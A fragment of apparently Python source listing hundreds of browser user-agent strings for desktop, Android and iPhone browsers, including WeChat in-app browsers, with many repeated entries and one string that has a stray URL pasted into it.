     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330',
     'Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8',
     'Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0',
     'Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0',
     'Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15',
     'Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3',
     'Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7', 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0', 'Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN', 'Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN']

mozila = [
     'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1',
     'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3',
     'Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0',
     'Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)',
     'Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5', 'Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20', 'Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a', 'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2', 'Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1', 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre',
     'Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2', 'Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0', 'Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
     'Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0',
     'Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1',
     'Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15',
     'Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko',
     'Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16',
     'Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025',
     'Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1',
     'Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020',
     'Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1',
     'Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)',
     'Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330',
     'Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8',
     'Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0',
     'Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0',
     'Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15',
     'Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3',
     'Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7', 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0', 'Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN', 'Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN',
     "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
	 "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
	 "Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
	 "Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
	 "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
	 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
	 "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
	 "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
	 "Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
